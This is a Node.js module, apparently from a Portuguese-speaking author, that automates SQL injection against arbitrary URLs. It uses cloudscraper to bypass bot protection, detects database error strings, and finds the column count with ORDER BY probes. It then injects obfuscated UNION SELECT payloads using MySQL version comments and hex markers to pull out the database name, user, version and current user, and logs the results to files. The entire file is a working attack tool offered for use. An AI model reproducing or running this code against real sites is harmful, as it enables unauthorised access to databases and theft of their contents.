const request = require('cloudscraper')
const parse = require('url-parse')
var fs = require('fs')
sql_errors1 = ['Convo Not found!','rowCount()', 'RecordCount()', 'ERROR:', 'Warning',
        'verificato un errore di archiviazione', 't execute query', 'mysql_result()',
        'Call to a member function on a non-object', 'Unknown column', 'Division by zero in',
        'mysql_fetch_', 'Unknown column', 'Warning: mysql_fetch_assoc():', 'Warning: Invalid argument supplied for foreach()',
        'DB Error: no such field', 'mysql_num_rows(): supplied argument is not a valid MySQL',
        'The Microsoft Jet database engine does not recognize', 'Unable to locate requested table',
        'ERROR: Unable to Get Page from Database', 'mysql_num_rows():', 'Syntax error in string in query expression',
        'Query fallita', 'This page contains the following errors:', 'Call to undefined method:',
        'Errore nella query:', 'Impossibile eseguire la query SELECT', 'Query failed:',
        'The database has returned the following error MySQL Error:Unknown column',
        'execute query', 'Warning: Division by zero', 'Cannot modify header information',
        'Call to a member function fetch()', 'Trying to get property of non-object in',
        'autorizzazione per questa operazione','error in your SQL syntax',
        'mysql_fetch', 'num_rows', 'ORA-01756',
        'Error Executing Database Query', 'SQLServer JDBC Driver',
        'Microsoft OLE DB Provider for SQL Server',
        'Unclosed quotation mark', 'ODBC Microsoft Access Driver',
        'Microsoft JET Database', 'Error Occurred While Processing Request',
        'Server Error', 'Microsoft OLE DB Provider for ODBC Drivers error', 'Invalid Querystring',
        'OLE DB Provider for ODBC', 'VBScript Runtime',
        'ADODB.Field', 'BOF or EOF', 'ADODB.Command',
        'JET Database', 'mysql_fetch_array()', 'Syntax error',
        'mysql_numrows()', 'GetArray()',
        'FetchRow()', 'Input string was not in a correct format'
    ]
    function EncontraErro(body) {
        try {
            for  (var i = 0, len = sql_errors1.length; i < len; i++) {
                if (body.indexOf(sql_errors1[i]) > -1 ) {
                    console.log(sql_errors1[i])
                    return true
                } 
            } 
            return false
        } catch (err)  {
            return false
        }
    } 

    function Geterro(url, idx) {
        return new Promise(function(resolve, reject){
                request.get(url, function (error, response, body) {
                    // in addition to parsing the value, deal with possible errors
                    if (error) return reject(error);
                    try {
                        // JSON.parse() can throw an exception if not valid JSON
                        resolve({retorno: JSON.parse(EncontraErro(body)),id: JSON.parse(idx)});
                    } catch(e) {
                        console.log("Geterro:",e)
                        reject(e);
                    }
                });
            });
        
    }
    function Getidresponse(url) {
        return new Promise(function(resolve, reject){
                request.get(url, function (error, response, body) {
                    // in addition to parsing the value, deal with possible errors
                    if (error) return reject(error);
                    try {
                        // JSON.parse() can throw an exception if not valid JSON
                        resolve({retorno: JSON.parse(EncontraErro(body)),id: JSON.parse(idx)});
                    } catch(e) {
                        reject(e);
                    }
                });
            });
        
    }
    async function BuscaIDColunas(url) {
        url = url + '+OrdEr+BY+';
        console.log("Localizando Quantidade de Colulas")
        return new Promise(async function(resolve, reject){
            try {
                for  (i = 1; i < 50; i++) {
                    console.log("GET: ",url+ i+"--")
                    await Geterro(url + i+"--",i).then(function(vullcheck) {
                        //console.log("BuscaIDColunas",vullcheck)
                        if (vullcheck.retorno === true) {
                            if ((vullcheck.id- 1) > 0) {
                                console.log('Coluna Encontrada: '+(vullcheck.id- 1))
                                SalvaRetorno(url + (i-1)+"--","colunaencontrada")
                            }
                            
                            resolve({retorno: JSON.parse(true),id: JSON.parse(vullcheck.id - 1)});
                            i = 1000;
                            return;
                        }  else {
                            console.log('Verificando Coluna: '+vullcheck.id)
                        }
                    })
                }
                resolve({retorno: JSON.parse(false),id: JSON.parse(0)});
            } catch(e) {
                resolve({retorno: JSON.parse(false),id: JSON.parse(0)});
            }    
        });
    }
    function Getidresponse(url) {
        return new Promise(function(resolve, reject){
                request.get(url, function (error, response, body) {
                    // in addition to parsing the value, deal with possible errors
                    //if (error) return reject(error);
                    try {
                        if (body.toLowerCase().indexOf('mysqlnotron') > -1) {
                            var regex = 'mysqlnotron=>(.*)<=mysqlnotron'
                            var result = body.match(regex);
                            var resulttemp = result[1];
                            var arr = resulttemp.split(":");
                            console.log("Resonse ID Localizado em:",arr[0])
                            SalvaRetorno(url,"Response_Encontrado")
                            resolve({retorno: JSON.parse(true),id: JSON.parse(arr[0])});
                        } else {
                            resolve({retorno: JSON.parse(false),id: JSON.parse(0)});
                        }
                    } catch(e) {
                        resolve({retorno: JSON.parse(false),id: JSON.parse(0)});
                    }
                });
            });
        
    }
    
    async function BuscaIDresponse(url,colunas) {
        return new Promise(async function(resolve, reject){
          
            for (i = 1; i < colunas + 1; i++) {
                var stringcolunas = '';
                for (i2 = 1; i2 < colunas + 1; i2++) {
                    if (i2 != i) {
                        stringcolunas = stringcolunas + i2
                    } else {
                        stringcolunas = stringcolunas + '/*!50000gROup_cONcat(0x6D7973716C6E6F74726F6E3D3E, '+ i + ",0x3a,0x3a, 0x3C3D6D7973716C6E6F74726F6E)*/"
                    }
                    if( i2 < colunas ){
                        stringcolunas = stringcolunas + ','
                    }
                }
                url = replaceAll(url,"=","=-")
                var urltemp  = url+"+/*!50000union*/+/*!50000select*/+" +stringcolunas
                console.log("ÜRL",urltemp)
                await Getidresponse(urltemp).then(function(vullcheck) {
                    if (vullcheck.retorno === true) {
                        resolve({retorno: JSON.parse(true),id: JSON.parse(vullcheck.id)});
                        i = 1000
                        i2 = 1000
                    }
                })
            }
            resolve({retorno: JSON.parse(false),id: JSON.parse(0)});
        })
    }
    async function InjetandoColuna(url,colunas,idresponse) {
        console.log("Resonse ID Localizado em:",idresponse)
        var stringcolunas = '';
        var injection = '/*!50000gROup_cONcat(0x6D7973716C6E6F74726F6E3D3E, database(), 0x3a, user(), 0x3a, Version(), 0x3a, current_user(), 0x3C3D6D7973716C6E6F74726F6E)*/'
        for (i2 = 1; i2 < colunas + 1; i2++) {
            if (i2 != idresponse) {
                stringcolunas = stringcolunas + i2
            } else {
                stringcolunas = stringcolunas + injection
            }
            if( i2 < colunas ){
                stringcolunas = stringcolunas + ','
            }
        }
        url = replaceAll(url,"=","=-")
        var urltemp  = url+"+/*!50000union*/+/*!50000select*/+" +stringcolunas
        //console.log(urltemp)
        return new Promise(async function(resolve, reject){
            await request.get(urltemp, function(error, response, body) {
                try {
                    //console.log(body.toLowerCase())
                    if (body.toLowerCase().indexOf('mysqlnotron') > -1) {
                        console.log('SQLI Encontrado: '+url);
                        var regex = 'mysqlnotron=>(.*)<=mysqlnotron'
                        var result = body.match(regex);
                        var resulttemp = result[1];
                        var arr = resulttemp.split(":");
                        console.log('[~] Current Database name: ' + arr[0])
                        console.log('[~] User: ' + arr[1])
                        console.log('[~] Database Version: ' + arr[2])
                        console.log('[~] Current User: ' + arr[3])
                        resulttemp = url + '\r\n'
                        resulttemp = resulttemp + '[~] Current Database name: ' + arr[0]+ '\r\n'
                        resulttemp = resulttemp +'[~] User: ' + arr[1]+ '\r\n'
                        resulttemp = resulttemp +'[~] Database Version: ' + arr[2]+ '\r\n'
                        resulttemp = resulttemp +'[~] Current User: ' + arr[3]+ '\r\n'
                        SalvaRetorno(resulttemp,"retorno")

                        resolve({retorno: true,
                            errorbase: true,
                            colunas: colunas,
                            dados:{url: url,
                            database: arr[0],
                            user: arr[1],
                            version: arr[2]}});
                    } else {
                        resolve({retorno: false,
                            errorbase: true,
                            colunas: colunas,
                            dados: null});
                    }
                } catch(e) {
                    resolve({retorno: false,
                        errorbase: true,
                        colunas: colunas,
                        dados: null});
                }    
            })
        });    
    }   

    function SalvaRetorno(url,caminho) {
        try {
           
            var logger = fs.createWriteStream(caminho + '.txt', {
                flags: 'a' // 'a' means appending (old data will be preserved)
            });
     
            logger.write(url + '\r\n')
            logger.end()
        } catch (err)  {
            //console.log(err);
        }
    }
    function replaceAll(str, find, replace) {
        return str.replace(new RegExp(find, 'g'), replace);
    }

class sqlinode {
 
    async SQLItest(url) {
        return new Promise(async function(resolve, reject){
        console.log("Testando URL:", url)
        try {
            const urltemp = url
            const oQueryParams =  parse(url, true);

            console.log("querys:" , oQueryParams.query)
            url = url+'+OrdEr+BY+1000--'
            console.log("Injetando URL:", url)
            //aguarda um minuto de timeout
            var timeOut = setTimeout(function(){
                console.log("Timeout")
                resolve({retorno: false,
                    errorbase: false,
                    colunas: 0,
                    dados: null})
                    return;
            },15000);
            request.get(url, function(error, response, body) {
                if (error) {
                    clearTimeout(timeOut)
                    resolve({retorno: false,
                        errorbase: false,
                        colunas: 0,
                        dados: null})
                        return;
                }
                console.log("statusCode",response.statusCode)
                console.log("protocolo",response.request.uri.protocol)
                if(response.statusCode == 200){
                    clearTimeout(timeOut)
                    console.log("Confirmando Erro...")
                    const vullcheck =  EncontraErro(body)
                    if (vullcheck == true) {
                        console.log('Vulneravel: '+urltemp);
                        BuscaIDColunas(urltemp).then(function(retorno) {
                            console.log("BuscaIDColunas",retorno)
                            if (retorno.retorno === true && retorno.id > 0) {
                                console.log("SQLItest",retorno)
                                console.log("Iniciando Inject")
                                var idcoluns = retorno.id
                                BuscaIDresponse(urltemp,retorno.id).then(function(retorno2) {
                                    console.log("BuscaIDresponse",retorno2)
                                    if (retorno2.retorno === true && retorno2.id > 0) {
                                        InjetandoColuna(urltemp,retorno.id,retorno2.id).then(function(retorno3) {

                                            console.log("InjetandoColuna",retorno3)
                                            resolve(retorno3)
                                        })
                                    } else {
                                        resolve({retorno: false,
                                            errorbase: false,
                                            colunas: 0,
                                            dados: null})
                                    }
                                })
                            }  else {
                                resolve({retorno: false,
                                    errorbase: false,
                                    colunas: 0,
                                    dados: null})
                            }
                         });
                    }  else {
                        resolve({retorno: false,
                        errorbase: false,
                        colunas: 0,
                        dados: null})
                    }
                } else {
                    clearTimeout(timeOut)
                    resolve({retorno: false,
                        errorbase: false,
                        colunas: 0,
                        dados: null})
                        return;
                }
            
            })
        } catch (err)  {
            clearTimeout(timeOut)
            resolve({retorno: false,
                errorbase: false,
                colunas: 0,
                dados: null})
                return;
        }
        });
    }
    
}

module.exports = new sqlinode();
